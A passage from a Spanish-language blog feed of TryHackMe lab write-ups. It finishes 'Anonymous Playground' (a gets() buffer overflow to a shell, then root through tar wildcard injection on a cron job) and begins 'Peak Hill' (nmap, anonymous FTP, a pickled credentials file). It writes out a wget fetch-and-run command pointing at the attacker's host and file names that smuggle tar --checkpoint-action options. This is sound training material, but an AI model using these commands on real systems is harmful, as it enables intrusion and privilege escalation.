&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;           0x004006d0      e84bfeffff     call sym.imp.system         &lt;span class=&#34;p&#34;&gt;;&lt;/span&gt; int system&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;const char *string&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;           0x004006d5      &lt;span class=&#34;m&#34;&gt;90&lt;/span&gt;             nop
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;           0x004006d6      5d             pop rbp
&lt;span class=&#34;se&#34;&gt;\ &lt;/span&gt;          0x004006d7      c3             ret
&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;0x00400570&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;&amp;gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;Para entenderlo con más claridad utilizamos &lt;code&gt;Ghidra&lt;/code&gt; y vemos el codigo fuente de ambas funciones, en main vemos que el valor de la variable &lt;code&gt;local_48&lt;/code&gt; tiene un tamaño de 64 y la segunda funcion simplemente realiza impresiones y una ejecucion:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;8
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;9
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-C:main.c&#34; data-lang=&#34;C:main.c&#34;&gt;&lt;span class=&#34;n&#34;&gt;undefined8&lt;/span&gt; &lt;span class=&#34;nf&#34;&gt;main&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;kt&#34;&gt;void&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;

&lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
  &lt;span class=&#34;kt&#34;&gt;char&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;local_48&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;64&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;];&lt;/span&gt;
  
  &lt;span class=&#34;n&#34;&gt;printf&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;#34;Who do you want to hack? &amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;
  &lt;span class=&#34;n&#34;&gt;gets&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;local_48&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;
  &lt;span class=&#34;k&#34;&gt;return&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;12
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;13
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;14
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;15
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;16
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;17
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-C:call_bash.c&#34; data-lang=&#34;C:call_bash.c&#34;&gt;&lt;span class=&#34;kt&#34;&gt;void&lt;/span&gt; &lt;span class=&#34;nf&#34;&gt;call_bash&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;kt&#34;&gt;void&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;

&lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
  &lt;span class=&#34;n&#34;&gt;puts&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span class=&#34;se&#34;&gt;\n&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;We are Anonymous.&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;
  &lt;span class=&#34;n&#34;&gt;sleep&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;
  &lt;span class=&#34;n&#34;&gt;puts&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;#34;We are Legion.&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;
  &lt;span class=&#34;n&#34;&gt;sleep&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;
  &lt;span class=&#34;n&#34;&gt;puts&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;#34;We do not forgive.&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;
  &lt;span class=&#34;n&#34;&gt;sleep&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;
  &lt;span class=&#34;n&#34;&gt;puts&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;#34;We do not forget.&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;
  &lt;span class=&#34;n&#34;&gt;sleep&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;
  &lt;span class=&#34;n&#34;&gt;puts&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;#34;[Message corrupted]...Well...done.&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;
  &lt;span class=&#34;n&#34;&gt;setuid&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;mh&#34;&gt;0x539&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt; &lt;span class=&#34;c1&#34;&gt;//1337
&lt;/span&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;  &lt;span class=&#34;n&#34;&gt;system&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;#34;/bin/sh&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;
  &lt;span class=&#34;k&#34;&gt;return&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;

&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;Realizando la ejecucion del binario logramos obtener el mensaje &lt;code&gt;Segmentation fault&lt;/code&gt; y el offset. Sabiendo el offset vamos a poder realizar la llamada a la funcion &lt;code&gt;call_bash&lt;/code&gt;.&lt;br /&gt;
&lt;img src=&#34;https://sckull.github.io/images/posts/thm/anonymousplayground/Screenshot_2020-08-17_19-32-48.png&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;p&gt;Logramos obtener una shell con el usuario &lt;code&gt;Spooky&lt;/code&gt;.&lt;br /&gt;
&lt;img src=&#34;https://sckull.github.io/images/posts/thm/anonymousplayground/Screenshot_2020-08-17_19-49-08.png&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;h2 id=&#34;privilege-escalation&#34;&gt;PRIVILEGE ESCALATION&lt;/h2&gt;
&lt;p&gt;Hacemos una pequeña enumeracion en el archivo &lt;code&gt;/etc/crontab&lt;/code&gt; y encontramos que existe un cron que es ejecutado por el usuario &lt;code&gt;root&lt;/code&gt; el cual realiza un backup de todo lo que se encuentre en &lt;code&gt;/home/spooky&lt;/code&gt;.&lt;br /&gt;
&lt;img src=&#34;https://sckull.github.io/images/posts/thm/anonymousplayground/Screenshot_2020-08-17_19-54-19.png&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;p&gt;Utilizamos los &amp;ldquo;parametros&amp;rdquo; para explotar esta vulnerabilidad creando un archivo que contenga nuestra shell inversa, y creamos los &amp;ldquo;parametros&amp;rdquo; los cuales van a ejecutar nuestra shell al igual que en la maquina &lt;a href=&#34;https://sckull.github.io/posts/cmess/#shell---root&#34;&gt;&lt;strong&gt;CMESS - THM&lt;/strong&gt;&lt;/a&gt;.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;nb&#34;&gt;echo&lt;/span&gt; &lt;span class=&#34;s1&#34;&gt;&amp;#39;bash -c  &amp;#34;$(wget -qO- http://10.2.29.162/shell.sh)&amp;#34; &amp;#39;&lt;/span&gt; &amp;gt; shell.sh
&lt;span class=&#34;nb&#34;&gt;echo&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;&amp;#34;&lt;/span&gt; &amp;gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;--checkpoint-action=exec=sh shell.sh&amp;#34;&lt;/span&gt;
&lt;span class=&#34;nb&#34;&gt;echo&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;&amp;#34;&lt;/span&gt; &amp;gt; --checkpoint&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;m&#34;&gt;1&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;Creamos nuestra shell en nuestra maquina, ponemos a la escucha netcat y logramos obtener nuestra shell con usuario root y nuestra flag &lt;code&gt;root.txt&lt;/code&gt;.&lt;br /&gt;
&lt;img src=&#34;https://sckull.github.io/images/posts/thm/anonymousplayground/Screenshot_2020-08-17_20-27-10.png&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
</content:encoded>
        <dc:creator>sckull</dc:creator>
        <media:content url="https://sckull.github.io/images/posts/thm/anonymousplayground/cover.png" medium="image"><media:title type="html">featured image</media:title></media:content>
        
        <media:content url="https://sckull.github.io/images/posts/thm/anonymousplayground/cover.png" medium="image"><media:title type="html">meta image</media:title></media:content>
        
          
            
              <category>linux</category>
            
          
        
        
          
            
              <category>tryhackme</category>
            
          
        
        
      </item>
      
      <item>
        <title>TryHackMe - Peak Hill</title>
        <link>https://sckull.github.io/posts/peakhill/</link>
        <pubDate>Sun, 16 Aug 2020 00:00:00 +0000</pubDate>
        
        <atom:modified>Sun, 16 Aug 2020 00:00:00 +0000</atom:modified>
        <guid>https://sckull.github.io/posts/peakhill/</guid>
        <description>Peak Hill es una maquina de TryHackMe aqui encontrarás la solucion para obtener la flag user.txt y root.</description>
        <content:encoded>&lt;p&gt;Peak Hill es una maquina de TryHackMe aqui encontrarás la solucion para obtener la flag user.txt y root.txt.&lt;/p&gt;




  



  &lt;div class=&#34;featured-image__wrapper&#34;&gt;
    &lt;img src=&#34;https://sckull.github.io/images/posts/thm/peakhill/cover.png&#34; alt=&#34;featured image&#34; class=&#34;featured-image&#34; style=&#34;width: ;height: ;&#34;&gt;
  &lt;/div&gt;

&lt;h3 id=&#34;informacion-de-la-maquina&#34;&gt;Informacion de la Maquina&lt;/h3&gt;
&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th&gt;Titulo&lt;/th&gt;
&lt;th&gt;Peak Hill&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;
&lt;tr&gt;
&lt;td&gt;Info&lt;/td&gt;
&lt;td&gt;Exercises in Python library abuse and some exploitation techniques&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;Puntos&lt;/td&gt;
&lt;td&gt;210&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;Dificultad&lt;/td&gt;
&lt;td&gt;Media&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;Maker&lt;/td&gt;
&lt;td&gt;&lt;a href=&#34;https://tryhackme.com/p/JohnHammond&#34;&gt;JohnHammond&lt;/a&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;
&lt;h2 id=&#34;nmap&#34;&gt;NMAP&lt;/h2&gt;
&lt;p&gt;Escaneo de puertos tcp, nmap nos muestra el puerto ftp (21, 20) y el puerto ssh (22) abiertos.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;12
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;c1&#34;&gt;# Nmap 7.80 scan initiated Sun Aug 16 20:09:24 2020 as: nmap -Pn -sV -o mini_scan peakhill.thm&lt;/span&gt;
Nmap scan report &lt;span class=&#34;k&#34;&gt;for&lt;/span&gt; peakhill.thm &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;10.10.29.120&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
Host is up &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;0.30s latency&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;.
Not shown: &lt;span class=&#34;m&#34;&gt;997&lt;/span&gt; filtered ports
PORT   STATE  SERVICE  VERSION
20/tcp closed ftp-data
21/tcp open   ftp      vsftpd 3.0.3
22/tcp open   ssh      OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Ubuntu Linux&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt; protocol 2.0&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
Service Info: OSs: Unix, Linux&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
&lt;span class=&#34;c1&#34;&gt;# Nmap done at Sun Aug 16 20:09:46 2020 -- 1 IP address (1 host up) scanned in 22.07 seconds&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;h2 id=&#34;ftp&#34;&gt;FTP&lt;/h2&gt;
&lt;p&gt;Ingresamos con las credenciales de anonymous (anonymous:anonymous) en donde encontramos dos archivos.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;12
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;13
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;14
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;15
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;16
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;17
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;18
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;19
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;20
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;21
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;22
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;23
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;24
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;25
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;26
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;27
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;28
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;29
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;30
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;31
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;32
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;33
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;kali@kali:~/thm/peakhill$ ftp peakhill.thm 
Connected to peakhill.thm.
&lt;span class=&#34;m&#34;&gt;220&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;vsFTPd 3.0.3&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
Name &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;peakhill.thm:kali&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;: anonymous
&lt;span class=&#34;m&#34;&gt;331&lt;/span&gt; Please specify the password.
Password:
&lt;span class=&#34;m&#34;&gt;230&lt;/span&gt; Login successful.
Remote system &lt;span class=&#34;nb&#34;&gt;type&lt;/span&gt; is UNIX.
Using binary mode to transfer files.
ftp&amp;gt; ls -lah
&lt;span class=&#34;m&#34;&gt;200&lt;/span&gt; PORT &lt;span class=&#34;nb&#34;&gt;command&lt;/span&gt; successful. Consider using PASV.
&lt;span class=&#34;m&#34;&gt;150&lt;/span&gt; Here comes the directory listing.
drwxr-xr-x    &lt;span class=&#34;m&#34;&gt;2&lt;/span&gt; ftp      ftp          &lt;span class=&#34;m&#34;&gt;4096&lt;/span&gt; May &lt;span class=&#34;m&#34;&gt;15&lt;/span&gt; 18:37 .
drwxr-xr-x    &lt;span class=&#34;m&#34;&gt;2&lt;/span&gt; ftp      ftp          &lt;span class=&#34;m&#34;&gt;4096&lt;/span&gt; May &lt;span class=&#34;m&#34;&gt;15&lt;/span&gt; 18:37 ..
-rw-r--r--    &lt;span class=&#34;m&#34;&gt;1&lt;/span&gt; ftp      ftp          &lt;span class=&#34;m&#34;&gt;7048&lt;/span&gt; May &lt;span class=&#34;m&#34;&gt;15&lt;/span&gt; 18:37 .creds
-rw-r--r--    &lt;span class=&#34;m&#34;&gt;1&lt;/span&gt; ftp      ftp            &lt;span class=&#34;m&#34;&gt;17&lt;/span&gt; May &lt;span class=&#34;m&#34;&gt;15&lt;/span&gt; 18:37 test.txt
&lt;span class=&#34;m&#34;&gt;226&lt;/span&gt; Directory send OK.
ftp&amp;gt; get .creds
local: .creds remote: .creds
&lt;span class=&#34;m&#34;&gt;200&lt;/span&gt; PORT &lt;span class=&#34;nb&#34;&gt;command&lt;/span&gt; successful. Consider using PASV.
&lt;span class=&#34;m&#34;&gt;150&lt;/span&gt; Opening BINARY mode data connection &lt;span class=&#34;k&#34;&gt;for&lt;/span&gt; .creds &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;m&#34;&gt;7048&lt;/span&gt; bytes&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;.
&lt;span class=&#34;m&#34;&gt;226&lt;/span&gt; Transfer complete.
&lt;span class=&#34;m&#34;&gt;7048&lt;/span&gt; bytes received in 0.00 secs &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;35.1911 MB/s&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
ftp&amp;gt; get test.txt
local: test.txt remote: test.txt
&lt;span class=&#34;m&#34;&gt;200&lt;/span&gt; PORT &lt;span class=&#34;nb&#34;&gt;command&lt;/span&gt; successful. Consider using PASV.
&lt;span class=&#34;m&#34;&gt;150&lt;/span&gt; Opening BINARY mode data connection &lt;span class=&#34;k&#34;&gt;for&lt;/span&gt; test.txt &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;m&#34;&gt;17&lt;/span&gt; bytes&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;.
&lt;span class=&#34;m&#34;&gt;226&lt;/span&gt; Transfer complete.
&lt;span class=&#34;m&#34;&gt;17&lt;/span&gt; bytes received in 0.00 secs &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;129.6997 kB/s&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
ftp&amp;gt; &lt;span class=&#34;nb&#34;&gt;pwd&lt;/span&gt;
&lt;span class=&#34;m&#34;&gt;257&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;/&amp;#34;&lt;/span&gt; is the current directory
ftp&amp;gt; bye
&lt;span class=&#34;m&#34;&gt;221&lt;/span&gt; Goodbye.
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;h2 id=&#34;pickle---creds&#34;&gt;PICKLE - .CREDS&lt;/h2&gt;
&lt;p&gt;En el servicio FTP encontramos dos archivos uno de ellos solo era un archivo de prueba, el otro tenia un mensaje en binario, utilizamos &lt;a href=&#34;https://gchq.github.io/CyberChef/&#34;&gt;&lt;strong&gt;CyberCheff&lt;/strong&gt;&lt;/a&gt; para ver el mensaje. En el mensaje vemos strings relacionados con SSH, intentamos decodificar con otros tipos de codificaciones y cifrado pero no logramos obtener nada.&lt;br /&gt;
&lt;img src=&#34;https://sckull.github.io/images/posts/thm/peakhill/Screenshot_2020-08-16_18-39-03.png&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;p&gt;En la descripcion de la maquina encontramos que la maquina incluye ejercicios de Python además de eso encontramos dos veces la imagen de un pepinillo que puede hacer referencia a la libreria de &lt;a href=&#34;https://pythonexamples.org/python-pickle-tutorial/&#34;&gt;&lt;code&gt;Pickle&lt;/code&gt;&lt;/a&gt;. Descargamos el archivo decodificado y utilizando Python logramos obtener el contenido, donde vemos tuplas con valores de &lt;code&gt;ssh_user&lt;/code&gt; y &lt;code&gt;ssh_pass&lt;/code&gt;.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;5
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&amp;gt;&amp;gt;&amp;gt; import pickle
&amp;gt;&amp;gt;&amp;gt; &lt;span class=&#34;nv&#34;&gt;picklefile&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; open&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;possible_pickle&amp;#39;&lt;/span&gt;, &lt;span class=&#34;s1&#34;&gt;&amp;#39;rb&amp;#39;&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
&amp;gt;&amp;gt;&amp;gt; print&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;pickle.load&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;picklefile&lt;span class=&#34;o&#34;&gt;))&lt;/span&gt;
